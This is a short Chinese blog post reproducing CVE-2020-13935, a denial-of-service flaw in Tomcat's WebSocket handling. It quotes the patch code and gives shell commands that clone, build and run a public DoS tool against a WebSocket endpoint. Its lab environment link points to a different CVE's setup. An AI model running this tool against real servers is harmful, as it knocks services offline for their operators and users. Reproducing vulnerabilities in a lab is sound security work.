---

layout: post
title:  "【漏洞复现】CVE-2020-13935 | Tomcat websocket 拒绝服务漏洞"
categories: 漏洞复现
tags: Tomcat 漏洞复现
author: 303Donatello

---


* content
{:toc}

## 准备环境
直接采用vulhub提供的[CVE-2020-1938](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938) docker环境进行启动即可。





## PATCH
在[java/org/apache/tomcat/websocket/WsFrameBase.java 206-270行](https://github.com/apache/tomcat/blob/c5e4066fc25c2b8611e476199d3361341c473257/java/org/apache/tomcat/websocket/WsFrameBase.java)中补丁如下：
```
            // The most significant bit of those 8 bytes is required to be zero
            // (see RFC 6455, section 5.2). If the most significant bit is set,
            // the resulting payload length will be negative so test for that.
            if (payloadLength < 0) {
                throw new WsIOException(
                        new CloseReason(CloseCodes.PROTOCOL_ERROR, sm.getString("wsFrame.payloadMsbInvalid")));
            }
```


## 漏洞利用
[传送门](https://github.com/RedTeamPentesting/CVE-2020-13935)
```
$ git clone https://github.com/RedTeamPentesting/CVE-2020-13935
$ cd CVE-2020-13935
$ go build
$ ./tcdos [WebSocket endpoint]
```
![](https://img2020.cnblogs.com/blog/2011235/202011/2011235-20201111172825405-896052511.png)

## 参考
[1]https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/
[2]https://github.com/apache/tomcat/blob/c5e4066fc25c2b8611e476199d3361341c473257/java/org/apache/tomcat/websocket/WsFrameBase.java